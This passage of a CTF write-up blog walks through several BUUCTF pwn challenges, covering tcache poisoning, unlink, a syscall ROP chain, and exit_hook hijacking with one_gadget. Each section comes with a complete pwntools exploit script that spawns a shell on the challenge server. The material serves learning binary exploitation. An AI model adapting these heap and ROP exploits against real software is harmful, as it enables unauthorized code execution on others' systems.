class="hljs-string">&quot;system&quot;</span>)+free-libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>edit(<span class="hljs-number">2</span>,p64(sys))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="十三、sctf-2019-one-heap"><a href="#十三、sctf-2019-one-heap" class="headerlink" title="十三、sctf_2019_one_heap"></a>十三、sctf_2019_one_heap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830160009616.png"><span class="image-caption">image-20210830160009616</span></p>
<p>checksec一下，64位，保护全开</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163315917.png"><span class="image-caption">image-20210830163315917</span></p>
<p>进入IDA，堆的菜单只有两种功能，申请和释放</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163404930.png"><span class="image-caption">image-20210830163404930</span></p>
<p>申请的堆块不能大于0x7f，并且申请和释放都有次数限制（其中能申请0xf次，释放4次）。而且，堆块我们只能访问到当前申请出的堆块</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163542538.png"><span class="image-caption">image-20210830163542538</span></p>
<p>释放堆块时，指针没有置0</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830185924091.png"><span class="image-caption">image-20210830185924091</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830200649131-1630325227529.png"><span class="image-caption">image-20210830200649131</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830201741615.png"><span class="image-caption">image-20210830201741615</span></p>
<p>连续释放两次大小为0x70的堆块，进入到tcache bin 中，然后根据一个字节未知进行爆破，使得堆块分配tcache_perthread_struct（就是开头0x250的那个堆块）上</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830203528418.png"><span class="image-caption">image-20210830203528418</span></p>
<p>把数值改为7，然后再把这个堆块释放，将会进入到unsorted bin中</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210232915.png"><span class="image-caption">image-20210830210232915</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210216419.png"><span class="image-caption">image-20210830210216419</span></p>
<p>fd，bk已经指向了libc中某个地址了，所以后面还是爆破一个字节，去让stdout吐出libc地址。然后因为tcache结构被改动很大，要先修复一下</p>
<p>后面其实就没有什么了，就是申请出堆块，因为我们把tcache_perthread_struct释放了，所以申请出的堆块都在上面，那么可以通过这个来填写出目标地址，然后就会进入到tcache bin中，接着再申请就能任意地址写。这边还要注意的就是还要用realloc调整一下rsp</p>
<p>然后这边说下，不知道是不是运气问题，爆破上千次都没打通</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./sctf_2019_one_heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,28247)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Input the size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Input the content:&quot;</span>)<br>	p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">first,second</span>):</span><br>	add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	free()<br>	free()<br>	add(<span class="hljs-number">0x70</span>,p16((first &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x10</span>))<br>	add(<span class="hljs-number">0x70</span>,p8(<span class="hljs-number">0x10</span>))<br>	add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x07000000</span>))<br>	free()<br>	add(<span class="hljs-number">0x40</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span>)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p16((second &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x60</span>))<br>	add(<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>	p.recv(<span class="hljs-number">8</span>)<br>	leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>	log.success(<span class="hljs-string">&quot;leak_addr==&gt;0x%x&quot;</span> %leak_addr)<br>	libc_base = leak_addr - <span class="hljs-number">0x3ed8b0</span><br>	ogg = libc_base + <span class="hljs-number">0x10a38c</span><br>	realloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__realloc_hook&quot;</span>]<br>	realloc = libc_base + libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br>	log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>	log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p64(realloc_hook))<br>	add(<span class="hljs-number">0x40</span>,p64(ogg) + p64(realloc + <span class="hljs-number">0x4</span>))<br>	add(<span class="hljs-number">0x10</span>)<br><br>	<span class="hljs-keyword">try</span>:<br>		p.sendline(<span class="hljs-string">&quot;id&quot;</span>)<br>		p.recvline_contains(<span class="hljs-string">&quot;uid&quot;</span>, timeout=<span class="hljs-number">2</span>)<br>		p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>		p.interactive()<br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">try</span>:<br>			p.close()<br>		<span class="hljs-keyword">except</span>:<br>			<span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>	n = <span class="hljs-number">0x1000</span><br>	<span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>		log.success(<span class="hljs-string">&quot;counts: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x1000</span> - n))<br>		<span class="hljs-keyword">try</span>:<br>			pwn(<span class="hljs-number">0x60</span>,<span class="hljs-number">0x67</span>)<br>		<span class="hljs-keyword">except</span>:<br>			<span class="hljs-keyword">pass</span><br>		<span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>		p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28247</span>)<br>		n -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>







<h2 id="十四、warmup"><a href="#十四、warmup" class="headerlink" title="十四、warmup"></a>十四、warmup</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104431370.png"><span class="image-caption">image-20210831104431370</span></p>
<p>常规checksec一下，32位，只开了NX</p>
<p>进入IDA，发现函数很少，而且都是调用系统调用号执行函数的。所以肯定是要执行到0xB的execve函数来getshell</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104803643.png"><span class="image-caption">image-20210831104803643</span></p>
<p>首先，要先制造出/bin/sh\x00才行，所以先跳转到read上去，往.bss段上写/bin/sh\x00。仔细看，这边传递的read的参数，都是来自于栈上的，而且都是esp前面的地址存的值，所以其实我们就是按照平常的写法，返回地址覆盖为这里的地址，然后再写一个新的返回地址，后面跟上read的三个参数<code>payload = &#39;a&#39;*0x20+p32(read)+p32(start)+p32(0)+p32(bss)+p32(8)</code></p>
<p>然后返回到最初再次执行，因为执行完函数的返回值是存在eax中的，所以为了达成0xb，第二次执行read函数时，要输入0xb个数据，因为execve(/bin/sh,0,0)，所以我们第二次的返回地址要直接返回到read函数传参（此时eax已经是0xb了，不能再执行0x804811D，不然eax的值将会被修改），因为执行完ret后，esp会加4，移动到我们溢出的p32(0)，然后传参才会把/bin/sh地址传入到ebx中，而0x8048212这个地址，在于这个地址上的值必须是0，满足这个要求即可，这样才能满足后续传入的是两个0</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104312190.png"><span class="image-caption">image-20210831104312190</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,25785)</span><br>p = process(<span class="hljs-string">&quot;./warmup&quot;</span>)<br>bss = <span class="hljs-number">0x80491bc</span><br>start = <span class="hljs-number">0x080480D8</span><br>read = <span class="hljs-number">0x0804811D</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&#x27;2016!&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(start)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(<span class="hljs-number">0x08048122</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x8048212</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">3</span>  )<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="十五、hitcontraining-unlink"><a href="#十五、hitcontraining-unlink" class="headerlink" title="十五、hitcontraining_unlink"></a>十五、hitcontraining_unlink</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831153526197.png"><span class="image-caption">image-20210831153526197</span></p>
<p>常规checksec一下，64位，开了NX，Canary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831154605863.png"><span class="image-caption">image-20210831154605863</span></p>
<p>进入IDA，四个菜单功能都具备，同时还找到个后门函数，但是看路径，应该是用不了的，buu的flag就在根目录下的</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831155631822.png"><span class="image-caption">image-20210831155631822</span></p>
<p>漏洞点在于修改函数里面，对于修改的size没有检查，存在堆溢出</p>
<p>由于在输入后会加0截断，并且没开PIE，堆指针简单可寻，所以这题用unlink做。目标是劫持atoi的got，</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831202645476.png"><span class="image-caption">image-20210831202645476</span></p>
<p>这里是触发了unlink，下一个大小为0x80的堆块与我们伪造的大小为0x40的堆块合并放入unsorted bin 中</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203042925.png"><span class="image-caption">image-20210831203042925</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203937694.png"><span class="image-caption">image-20210831203937694</span></p>
<p>同时，指向chunk0的指针保存的地址换为了ptr - 0x18的值，所以，此时可以认为chunk0变成是在ptr - 0x18的地方了。所以此时再把堆指针改为函数got表地址，从而泄露libc地址</p>
<p>而刚好，此时又是atoi的got表地址，所以直接继续往里面写入system的地址即可，最后再输入/bin/sh\x00即可</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831204445381.png"><span class="image-caption">image-20210831204445381</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25062</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;the name of item:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of item:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.recvuntil(<span class="hljs-string">&quot;the new name of the item:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;the index of item:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>ptr = <span class="hljs-number">0x00000000006020C8</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size size</span><br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x40</span>) + p64(atoi_got)<br>edit(<span class="hljs-number">0</span>,payload)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>log.success(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="十六、wustctf2020-closed"><a href="#十六、wustctf2020-closed" class="headerlink" title="十六、wustctf2020_closed"></a>十六、wustctf2020_closed</h2><p>这题比较有意思，记录一下，考的是linux的基础知识</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152712612.png"><span class="image-caption">image-20210902152712612</span></p>
<p>进入IDA，程序十分简单，甚至主函数已经运行了system(“/bin/sh”)了，但是注意这边执行了close(1)以及close(2)。这代表什么？代表关闭了linux里面的标准输出(1)和标准错误(2)，所以即使已经getshell了，但是我们是看不到输出的，所以这时候输入<code>exec 1&gt;&amp;0</code>就可以让标准输出的文件描述符重定向为0，而0没被关闭，才能看到输出</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152420434.png"><span class="image-caption">image-20210902152420434</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152447680.png"><span class="image-caption">image-20210902152447680</span></p>
<h2 id="十七、ciscn-2019-n-7"><a href="#十七、ciscn-2019-n-7" class="headerlink" title="十七、ciscn_2019_n_7"></a>十七、ciscn_2019_n_7</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904105152457.png"><span class="image-caption">image-20210904105152457</span></p>
<p>常规checksec一下，64位，保护全开</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111520818.png"><span class="image-caption">image-20210904111520818</span></p>
<p>进入IDA，分析程序，首先程序不存在释放功能，并且堆块只能生成一次，这直接断绝了劫持hook指针的做法</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111633970.png"><span class="image-caption">image-20210904111633970</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111749218.png"><span class="image-caption">image-20210904111749218</span></p>
<p>在add，edit函数中，我们可以直接修改程序中的堆块指针，也就是说，我们拥有了任意写的能力</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111836132.png"><span class="image-caption">image-20210904111836132</span></p>
<p>其次在输入666后，程序会打印出puts的地址，也就是也拥有了libc地址，似乎一切都具备了？就差一个可以让我们直接写入one_gadget的地方。写在哪？这里介绍一个新的hook，exit_hook，在执行exit函数时，会执行到两个函数，分别是<code>_dl_rtld_lock_recursive</code>和<code>_dl_rtld_unlock_recursive</code>，其中一个劫持为one_gadget都行，并且这两个的偏移是固定的值</p>
<p>libc-2.23.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x5F0F48</li>
<li>rtld_unlock = libc_base + 0x5F0F50</li>
</ul>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904113624683.png"><span class="image-caption">image-20210904113624683</span></p>
<p>刚好很巧，这边执行到exit时，也是把文件描述符1和2关闭了，看不见输出，所以跟上题一样的处理方式，<code>exec 1&gt;&amp;0</code>才能看到交互</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904113504655.png"><span class="image-caption">image-20210904113504655</span></p>
<p>成功getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_7&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28496</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Input string Length:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">name,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;New Author name:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;contents:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exit</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;666&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0xf1147</span><br>rtld_lock = libc_base + <span class="hljs-number">0x5F0F48</span><br>add(<span class="hljs-number">0x60</span>,p64(rtld_lock) * <span class="hljs-number">2</span>)<br>edit(p64(rtld_lock) * <span class="hljs-number">2</span>,p64(ogg))<br>exit()<br>p.sendline(<span class="hljs-string">&quot;exec 1&gt;&amp;0&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;ls&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="十九、ciscn-2019-es-4"><a href="#十九、ciscn-2019-es-4" class="headerlink" title="十九、ciscn_2019_es_4"></a>十九、ciscn_2019_es_4</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904121810292.png"><span class="image-caption">image-20210904121810292</span></p>
<p>checksec一下，64位，PIE没开</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221627524.png"><span class="image-caption">image-20210904221627524</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221644339.png"><span class="image-caption">image-20210904221644339</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221657542.png"><span class="image-caption">image-20210904221657542</span></p>
<p>首先漏洞点存在edit函数里面，offbynull，其次edit和show函数，都存在验证次数问题，并且验证的值保存在.bss上，没开PIE，也就是说，应该是unlink的题，把chunk改到.bss上，然后修改key值。然后版本是libc-2.27.so，存在tcache，所以在假chunk底下那个chunk要释放七个相同大小去填充tcache bin</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904230122725.png"><span class="image-caption">image-20210904230122725</span></p>
<p>unlink成功，把chunk的指针设为.bss上的值</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904231117920.png"><span class="image-caption">image-20210904231117920</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904231321497.png"><span class="image-caption">image-20210904231321497</span></p>
<p>通过unlink设置的指针，把前面两个修改为同一个堆地址，借此造成double free，然后把堆块分配到key上，修改key值，让show功能恢复使用，然后通过show功能泄露libc地址。然后再次使用unlink设置好的指针，把前面的堆块指针改为指向free_hook，然后通过edit函数，往里面写入system函数，之后free一个写有/bin/sh的堆块即可</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210904234122710.png"><span class="image-caption">image-20210904234122710</span></p>
<p>然后，远程打时，堆块地址是只有图中那么长的，要注意一下。然后就是我们最后往free_hook写入system的那个堆块，必须要在这之前是被申请出来的，具体原因我也不知道为什么，我做的时候一直卡在这最后一步，没想通，然后是对照别人wp才改了这个点，然后通了</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905095712141.png"><span class="image-caption">image-20210905095712141</span></p>
<p>getshell！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_es_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29483</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;gift: &quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br>	<br><span 